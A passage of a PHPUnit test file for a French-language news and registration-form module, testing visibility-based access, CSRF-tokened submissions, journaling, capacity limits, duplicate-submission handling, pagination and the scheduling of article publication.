        $this->assertSame('chief', $saved?->responseRoleMin);
    }

    /**
     * Issue #1140: the Finances account and category come back too, and
     * a cleared opening date stays cleared rather than reverting to today.
     */
    public function testARefusedSubmissionKeepsTheFinanceChoiceAndAClearedDate(): void
    {
        [$controller, $token] = $this->controllerWithFinanceAccounts();
        $body = $this->refusedSubmissionWithSettings();
        $body['_csrf_token'] = $token;
        $body['form_finance_account_id'] = '42';
        $body['form_finance_category_id'] = '5';
        $body['form_opens_at'] = '';
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $controller->store(new Request('POST', '/news', [], $body, [], []), []);

        $html = $response->getBody();
        $this->assertSame(422, $response->getStatusCode());
        $this->assertMatchesRegularExpression('/<option value="42"\s+selected/', $html, 'account');
        $this->assertMatchesRegularExpression('/<option value="5"\s+selected/', $html, 'category');
        $this->assertDoesNotMatchRegularExpression('/id="form_opens_at"[^>]*value="2\d{3}-/', $html, 'a cleared date came back');
    }

    /**
     * @dataProvider visibilityAccessProvider
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('visibilityAccessProvider')]
    public function testStoreDerivesFormAccessFromVisibilityNotFromRequest(string $visibility, string $expectedAccess): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $fieldsJson = json_encode([
            ['id' => null, 'field_type' => 'short_text', 'label' => 'Nom', 'is_required' => true, 'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null, 'confirmation_text' => null],
        ]);

        $request = new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Camp',
            'summary' => 'Un résumé en une phrase.',
            'visibility' => $visibility,
            // Deliberately the opposite of $expectedAccess — there is no
            // "Accès au formulaire" control anymore, so this must be
            // ignored and derived from visibility instead.
            'form_access' => $expectedAccess === NewsForm::ACCESS_PUBLIC ? 'identified' : 'public',
            'fields_json' => $fieldsJson,
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $form = $this->formRepository->findByArticleId($article->id);
        $this->assertSame($expectedAccess, $form->access);
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function visibilityAccessProvider(): array
    {
        return [
            'public visibility needs no login' => [Article::VISIBILITY_PUBLIC, NewsForm::ACCESS_PUBLIC],
            'direct_link visibility needs no login' => [Article::VISIBILITY_DIRECT_LINK, NewsForm::ACCESS_PUBLIC],
            'chief visibility requires login' => [Article::VISIBILITY_CHIEF, NewsForm::ACCESS_IDENTIFIED],
            'admin visibility requires login' => [Article::VISIBILITY_ADMIN, NewsForm::ACCESS_IDENTIFIED],
        ];
    }

    public function testCreateEditorPageDefaultsSeoStopDateToSixMonthsFromNow(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), []);

        $expected = (new \DateTimeImmutable('+6 months'))->format('Y-m-d');
        $this->assertStringContainsString('id="seo_stop_date" value="' . $expected . '"', $response->getBody());
    }

    /**
     * @return array{name: string, tmp_name: string, error: int, size: int, type: string}
     */
    private function fakeUploadedImage(): array
    {
        $path = tempnam(sys_get_temp_dir(), 'news_test_image_') . '.jpg';
        $image = imagecreatetruecolor(10, 10);
        imagejpeg($image, $path);
        imagedestroy($image);

        return ['name' => 'photo.jpg', 'tmp_name' => $path, 'error' => UPLOAD_ERR_OK, 'size' => filesize($path), 'type' => 'image/jpeg'];
    }

    public function testDeleteRejectsNonAuthorChief(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));

        AuthSession::login(999, 'other-chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $request = new RequestWithInput('DELETE', '/news/' . $id, [], [], [], [], json_encode(['_csrf_token' => $csrfToken]));

        $response = $this->newsController->delete($request, ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
        $this->assertNotNull($this->articleRepository->findById($id));
    }

    public function testDeleteJournalsTheDeletionByTheAuthor(): void
    {
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);

        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'article_deleted', 'info', $this->anything(), ['article_id' => $id], $this->chiefAccountId);

        $request = new RequestWithInput('DELETE', '/news/' . $id, [], [], [], [], json_encode(['_csrf_token' => $csrfToken]));

        $response = $this->newsController->delete($request, ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
    }

    public function testStoreJournalsTheArticleCreation(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'article_created', 'info', $this->anything(), $this->anything(), $this->chiefAccountId);

        $request = new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Nouveau camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
    }

    public function testUpdateJournalsTheArticleUpdate(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null));
        $csrfToken = CsrfGuard::generateToken();

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'article_updated', 'info', $this->anything(), ['article_id' => $id], $this->chiefAccountId);

        $request = new Request('POST', '/news/' . $id, [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Camp modifié',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->update($request, ['id' => (string) $id]);

        $this->assertSame(302, $response->getStatusCode());
    }

    /**
     * The editor sets a cap the existing answers already exceed (issue
     * #1465): the save goes through, the counter is recomputed and
     * journaled with the acting account, and the page says so.
     */
    public function testACapBelowTheExistingAnswersIsJournaledAndTheEditorWarns(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null));
        $formId = $this->formRepository->create($id, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $placesId = $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Places bus', false, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'a@test.com', [$placesId => '20'], null, null);
        $this->responseRepository->create($formId, null, null, 'b@test.com', [$placesId => '10'], null, null);
        $logged = [];
        $this->journalService->method('log')->willReturnCallback(
            function (string $module, string $event, string $level, string $description, array $context = [], ?int $userId = null) use (&$logged): void {
                $logged[] = [$module, $event, $level, $context, $userId];
            }
        );
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->update(new Request('POST', '/news/' . $id, [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'form_access' => 'public',
            'fields_json' => json_encode([[
                'id' => $placesId, 'field_type' => FormField::TYPE_NUMBER, 'label' => 'Places bus', 'capacity_max' => '25',
            ]]),
        ], [], []), ['id' => (string) $id]);

        $this->assertSame(302, $response->getStatusCode());
        $this->assertContains(
            ['news', 'form_field_capacity_recomputed', 'info',
                ['form_id' => $formId, 'field_id' => $placesId, 'capacity_max' => 25, 'capacity_used' => 30.0],
                $this->chiefAccountId],
            $logged
        );
        $flash = \Core\Http\FlashMessage::get();
        $this->assertSame('warning', $flash['type'] ?? null);
        $this->assertStringContainsString('« Places bus » : 30 places déjà prises pour une capacité de 25', (string) ($flash['message'] ?? ''));
        $this->assertSame(30.0, $this->fieldRepository->usedCapacity($placesId));
    }

    public function testUpdateResponseJournalsTheResponseUpdate(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $responseId = $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        // canEditResponse() only allows an admin (or the response's own
        // author) to edit someone else's anonymous submission.
        AuthSession::login($this->chiefAccountId, 'admin@test.com', 'admin');

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'form_response_updated', 'info', $this->anything(), $this->anything(), $this->chiefAccountId);

        $csrfToken = CsrfGuard::generateToken();
        $request = new Request('POST', '/news/' . $articleId . '/form/responses/' . $responseId . '/edit', [], [
            '_csrf_token' => $csrfToken,
            'contact_email' => 'parent@test.com',
            'field_' . $fieldId => 'Alicia',
        ], [], []);

        $response = $this->formController->updateResponse($request, ['id' => (string) $articleId, 'response_id' => (string) $responseId]);

        $this->assertSame(302, $response->getStatusCode());
    }

    /**
     * An edit asking more places than the others left: refused on the
     * edit form itself, with the reason, the stored answer untouched and
     * the transaction the check ran in rolled back — not left open under
     * the rest of the request.
     */
    public function testAnEditAskingMorePlacesThanRemainIsRefusedOnTheEditForm(): void
    {
        $articleId = $this->publishedArticle();
        $formId = $this->formRepository->create(
            $articleId,
            NewsForm::ACCESS_PUBLIC,
            NewsForm::RESPONSE_LIMIT_UNLIMITED,
            null,
            null,
            false,
            'chief',
            null,
            null
        );
        $fieldId = $this->fieldRepository->create(
            $formId, 0, FormField::TYPE_NUMBER, 'Places', true, null, null, 3, null, null
        );
        $responseId = $this->responseRepository->create(
            $formId, null, null, 'parent@test.com', [$fieldId => '1'], null, null
        );
        $this->responseRepository->create($formId, null, null, 'autre@test.com', [$fieldId => '2'], null, null);
        AuthSession::login($this->chiefAccountId, 'admin@test.com', 'admin');
        $this->journalService->expects($this->never())->method('log');

        $response = $this->formController->updateResponse(
            new Request('POST', '/news/' . $articleId . '/form/responses/' . $responseId . '/edit', [], [
                '_csrf_token' => CsrfGuard::generateToken(),
                'contact_email' => 'parent@test.com',
                'field_' . $fieldId => '2',
            ], [], []),
            ['id' => (string) $articleId, 'response_id' => (string) $responseId]
        );

        $this->assertSame(422, $response->getStatusCode());
        $this->assertStringContainsString(
            'Il n&#039;y a plus assez de places disponibles pour &quot;Places&quot;.',
            $response->getBody()
        );
        $this->assertSame([$fieldId => '1'], $this->responseRepository->getValues($responseId));
        $this->assertFalse($this->pdo->inTransaction());
    }

    /**
     * A reorder naming questions that are not the form's: refused as
     * JSON, and the questions keep their order.
     */
    public function testReorderingWithAForeignQuestionIsRefusedAndChangesNothing(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->publishedArticle();
        $formId = $this->formRepository->create(
            $articleId,
            NewsForm::ACCESS_PUBLIC,
            NewsForm::RESPONSE_LIMIT_UNLIMITED,
            null,
            null,
            false,
            'chief',
            null,
            null
        );
        $first = $this->fieldRepository->create(
            $formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null
        );
        $second = $this->fieldRepository->create(
            $formId, 1, FormField::TYPE_SHORT_TEXT, 'Prénom', true, null, null, null, null, null
        );
        $body = (string) json_encode(['_csrf_token' => CsrfGuard::generateToken(), 'ids' => [$second, 999]]);

        $response = $this->formController->reorderFields(
            new RequestWithInput('PATCH', '/news/' . $articleId . '/form/fields/reorder', [], [], [], [], $body),
            ['id' => (string) $articleId]
        );

        $this->assertSame(422, $response->getStatusCode());
        $this->assertSame(
            ['success' => false, 'error' => 'Liste de champs invalide.'],
            json_decode($response->getBody(), true)
        );
        $this->assertSame(
            [$first, $second],
            array_map(static fn (FormField $field): int => $field->id, $this->fieldRepository->findByFormId($formId))
        );
    }

    /** A public article, published, by the chief — the fixture the two tests above start from. */
    private function publishedArticle(): int
    {
        return NewsTestHelper::publish($this->pdo, $this->articleRepository->create(
            'Camp',
            Article::VISIBILITY_PUBLIC,
            false,
            null,
            null,
            $this->chiefAccountId
        ));
    }

    public function testSubmitJournalsTheResponseSubmission(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'form_response_submitted', 'info', $this->anything(), $this->anything(), null);

        $csrfToken = CsrfGuard::generateToken();
        $submitRequest = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => $csrfToken,
            'contact_email' => 'parent@test.com',
            'field_' . $fieldId => 'Alice',
        ], [], []);

        $response = $this->formController->submit($submitRequest, ['id' => (string) $articleId]);

        // A redirect since #251 (Post/Redirect/Get) — the journal entry
        // this test is about is written before it.
        $this->assertSame(302, $response->getStatusCode());
    }

    /**
     * #251, server side. The public form had no guard against a double
     * submission at all: no disabled button, no redirect after POST, and
     * no server-side de-duplication for a form that accepts any number of
     * answers. A double click created two responses — and on a paying
     * form, two receivables and two tickets.
     */
    public function testTheSameAnswerSentTwiceIsOneResponse(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $body = [
            '_csrf_token' => CsrfGuard::generateToken(),
            'contact_email' => 'parent@test.com',
            'field_' . $fieldId => 'Alice',
        ];
        $submit = fn (): \Core\Http\Response => $this->formController->submit(
            new Request('POST', '/news/' . $articleId . '/form/submit', [], $body, [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame(302, $submit()->getStatusCode());
        $this->assertSame(302, $submit()->getStatusCode(), 'the second send must answer like the first');

        $this->assertSame(
            1,
            (int) $this->pdo->query('SELECT COUNT(*) FROM news_form_responses')->fetchColumn(),
            'a double click created two responses',
        );
    }

    /** A different answer from the same address is a different response. */
    public function testADifferentAnswerFromTheSameAddressIsStillANewResponse(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        foreach (['Alice', 'Basile'] as $name) {
            $this->formController->submit(
                new Request('POST', '/news/' . $articleId . '/form/submit', [], [
                    '_csrf_token' => CsrfGuard::generateToken(),
                    'contact_email' => 'parent@test.com',
                    'field_' . $fieldId => $name,
                ], [], []),
                ['id' => (string) $articleId]
            );
        }

        $this->assertSame(2, (int) $this->pdo->query('SELECT COUNT(*) FROM news_form_responses')->fetchColumn());
    }

    /**
     * #240. The responses page rendered every response there was, and
     * asked for each one's answers in its own query.
     */
    public function testTheResponsesPageIsPaginated(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'admin');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        for ($i = 0; $i < 55; $i++) {
            $this->responseRepository->create($formId, null, null, 'p' . $i . '@test.com', [$fieldId => 'Nom ' . $i], null, null);
        }

        $first = $this->formController->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringContainsString('Nom 0', $first);
        $this->assertStringNotContainsString('Nom 54', $first);
        // The export and « Écrire » still cover the whole filter, not the
        // page: telling a chief they are writing to fifty people when they
        // are writing to fifty-five only shows after the send.
        $this->assertStringContainsString('Exporter (55)', $first);
        $this->assertStringContainsString('Pagination des réponses', $first);

        $second = $this->formController->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', ['page' => '2'], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringContainsString('Nom 54', $second);
        $this->assertStringNotContainsString('Nom 0<', $second);
    }

    public function testExportResponsesJournalsTheExport(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'form_responses_exported', 'info', $this->anything(), $this->anything(), $this->chiefAccountId);

        $response = $this->formController->exportResponses(new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
    }

    /**
     * Before publication, anybody but a manager gets « pas encore en
     * ligne » — a 404 that shows nothing of the article — even holding
     * the address of a « Lien direct » article (issue #845).
     */
    public function testANotOnlineArticleIsAnswered404WithNothingOfIt(): void
    {
        $id = $this->articleRepository->create('Souper secret', Article::VISIBILITY_DIRECT_LINK, false, null, null, $this->chiefAccountId, 'Résumé caché.', null);
        $this->articleRepository->setPublication($id, Article::STATUS_PUBLISHED, '2999-01-20 08:00:00');

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);
        $body = $response->getBody();

        $this->assertSame(404, $response->getStatusCode());
        $this->assertStringContainsString('Cette actualité n\'est pas encore en ligne.', $body);
        $this->assertStringContainsString('Elle le sera le ', $body);
        $this->assertStringContainsString('<meta name="robots" content="noindex">', $body);
        $this->assertStringNotContainsString('Souper secret', $body);
        $this->assertStringNotContainsString('Résumé caché.', $body);
    }

    /**
     * The visibility is checked before the state: a visitor who could not
     * read the article once published learns neither that it exists nor
     * when it will be out — the same refusal as for the published one,
     * and no link preview of an article that is not online.
     */
    public function testANotOnlineArticleBeyondTheReadersVisibilityIsRefusedNotAnnounced(): void
    {
        $chief = $this->articleRepository->create('Réunion des chefs', Article::VISIBILITY_CHIEF, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $this->articleRepository->setPublication($chief, Article::STATUS_PUBLISHED, '2999-01-20 08:00:00');
        $members = $this->articleRepository->create('Souper des membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $this->articleRepository->setPublication($members, Article::STATUS_PUBLISHED, '2999-01-20 08:00:00');

        foreach ([$chief, $members] as $id) {
            $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

            $this->assertSame(403, $response->getStatusCode());
            $this->assertStringNotContainsString('Elle le sera le', $response->getBody());
            $this->assertStringNotContainsString('og:title', $response->getBody());
        }
    }

    /**
     * A manager reads the draft as it will be, under a banner saying it is
     * not online and why they see it; its form shows but takes nothing.
     */
    public function testAManagerReadsADraftUnderABanner(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $formId = $this->formRepository->create($id, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);
        $body = $response->getBody();

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('data-news-not-live', $body);
        $this->assertStringContainsString('Brouillon — non publiée', $body);
        $this->assertStringContainsString('<fieldset disabled>', $body);
        $this->assertStringContainsString('Le formulaire n\'accepte aucune réponse avant la publication.', $body);
        $this->assertStringContainsString('<meta name="robots" content="noindex">', $body);
        $this->assertStringNotContainsString('og:title', $body);
    }

    /**
     * The form of an article that is not online refuses a submission on
     * the server too — a manager's included.
     */
    public function testTheFormOfADraftRefusesASubmission(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $formId = $this->formRepository->create($id, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $nameId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $response = $this->formController->submit(new Request('POST', '/news/' . $id . '/form/submit', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'contact_email' => 'famille@test.com',
            'field_' . $nameId => 'Bob',
        ], [], []), ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
        $this->assertSame(0, (int) $this->pdo->query('SELECT COUNT(*) FROM news_form_responses')->fetchColumn());
    }

    /**
     * « Publier » is the editor's save with intent=publish: saved, put
     * online, and journalled as such.
     */
    public function testUpdateWithThePublishIntentPutsTheArticleOnline(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);

        $events = [];
        $this->journalService->method('log')->willReturnCallback(
            function (string $module, string $event) use (&$events): void {
                $events[] = $event;
            }
        );

        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $this->newsController->update(new Request('POST', '/news/' . $id, [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'intent' => 'publish',
        ], [], []), ['id' => (string) $id]);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findById($id);
        $this->assertNotNull($article);
        $this->assertTrue($this->articleService->isLive($article));
        $this->assertSame(['article_updated', 'article_published'], $events);
    }

    public function testUpdateWithTheUnpublishIntentTakesTheArticleOffline(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null));

        $events = [];
        $this->journalService->method('log')->willReturnCallback(
            function (string $module, string $event) use (&$events): void {
                $events[] = $event;
            }
        );

        $_FILES['image'] = $this->fakeUploadedImage();
        $this->newsController->update(new Request('POST', '/news/' . $id, [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'intent' => 'unpublish',
        ], [], []), ['id' => (string) $id]);

        $article = $this->articleRepository->findById($id);
        $this->assertNotNull($article);
        $this->assertSame(Article::STATUS_DRAFT, $article->status);
        $this->assertSame(['article_updated', 'article_unpublished'], $events);
    }

    /**
     * The editor of a draft offers « Publier » with its question, and
     * delete; the editor of an online article offers « Repasser en
     * brouillon » and no delete.
     */
    public function testTheEditorsButtonsFollowTheState(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $request = new Request('GET', '/news/' . $id . '/gerer', [], [], [], []);

        $draft = $this->newsController->edit($request, ['id' => (string) $id])->getBody();
        $this->assertStringContainsString('id="news-publish-btn"', $draft);
        $this->assertStringContainsString('data-confirm-title="Publier pour tout le monde ?"', $draft);
        $this->assertStringContainsString('Enregistrer le brouillon', $draft);
        $this->assertStringNotContainsString('value="unpublish"', $draft);

        $this->articleService->publish($id);
        $online = $this->newsController->edit($request, ['id' => (string) $id])->getBody();
        $this->assertStringNotContainsString('id="news-publish-btn"', $online);
        $this->assertStringContainsString('value="unpublish"', $online);
        $this->assertStringContainsString('Pour supprimer cette actualité, repassez-la d\'abord en brouillon.', $online);
    }

    public function testDeletingAnOnlineArticleIsRefused(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $request = new RequestWithInput('DELETE', '/news/' . $id, [], [], [], [], json_encode(['_csrf_token' => CsrfGuard::generateToken()]));
        $response = $this->newsController->delete($request, ['id' => (string) $id]);

        $this->assertSame(409, $response->getStatusCode());
        $this->assertNotNull($this->articleRepository->findById($id));
    }

    /**
     * « Programmer… » (issue #845, part 2): the editor's save with
     * intent=schedule and the dialog's date and time — the article is
     * saved, scheduled, the author's notice armed for that minute.
     */
    public function testUpdateWithTheScheduleIntentProgramsTheArticle(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $events = $this->recordJournal();
        $at = new \DateTimeImmutable('+3 days 08:00');

        $response = $this->postSchedule($id, $at->format('Y-m-d'), '08:00');

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findById($id);
        $this->assertNotNull($article);
        $this->assertSame(Article::STATE_SCHEDULED, $this->articleService->state($article));
        $this->assertSame($at->format('Y-m-d') . ' 08:00:00', substr((string) $article->publishedAt, 0, 19));
        $this->assertSame(['article_updated', 'article_scheduled'], $events->getArrayCopy());

        $task = $this->schedulerService->find('news', 'publish_scheduled_articles', 'article-' . $id);
        $this->assertNotNull($task);
        $this->assertSame($at->format('Y-m-d') . ' 08:00:00', $task['run_at']);

        // Moved: still one run, at the new time.
        $this->postSchedule($id, $at->format('Y-m-d'), '18:30');
        $this->assertSame($at->format('Y-m-d') . ' 18:30:00', $this->schedulerService->find('news', 'publish_scheduled_articles', 'article-' . $id)['run_at']);
        $this->assertSame(1, (int) $this->pdo->query("SELECT COUNT(*) FROM scheduled_actions WHERE task_key = 'publish_scheduled_articles' AND status = 'pending'")->fetchColumn());
    }

    /**
     * A time already past is refused before anything is saved: the editor
     * comes back with the message and the article is as it was.
     */
    public function testAPastScheduleIsRefusedAndNothingIsSaved(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);

        $response = $this->postSchedule($id, (new \DateTimeImmutable('-1 day'))->format('Y-m-d'), '08:00', 'Camp renommé');

        $this->assertSame(422, $response->getStatusCode());
        $this->assertStringContainsString('Cette heure est déjà passée : choisissez un moment à venir.', $response->getBody());
        $article = $this->articleRepository->findById($id);
        $this->assertNotNull($article);
        $this->assertSame('Camp', $article->title);
        $this->assertSame(Article::STATUS_DRAFT, $article->status);
    }

    public function testPublishingAScheduledArticleNowWithdrawsItsNotice(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $this->postSchedule($id, (new \DateTimeImmutable('+3 days'))->format('Y-m-d'), '08:00');

        $_FILES['image'] = $this->fakeUploadedImage();
        $this->newsController->update(new Request('POST', '/news/' . $id, [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'intent' => 'publish',
        ], [], []), ['id' => (string) $id]);

        $article = $this->articleRepository->findById($id);
        $this->assertNotNull($article);
        $this->assertTrue($this->articleService->isLive($article));
        $this->assertNull($this->schedulerService->find('news', 'publish_scheduled_articles', 'article-' . $id));
    }

    // ── Create first, publish after (issue #1357) ───────────────────────

    /** @return array<string, string> a valid creation POST, with the intent given */
    private function creationBody(string $intent, array $more = []): array
    {
        return $more + [
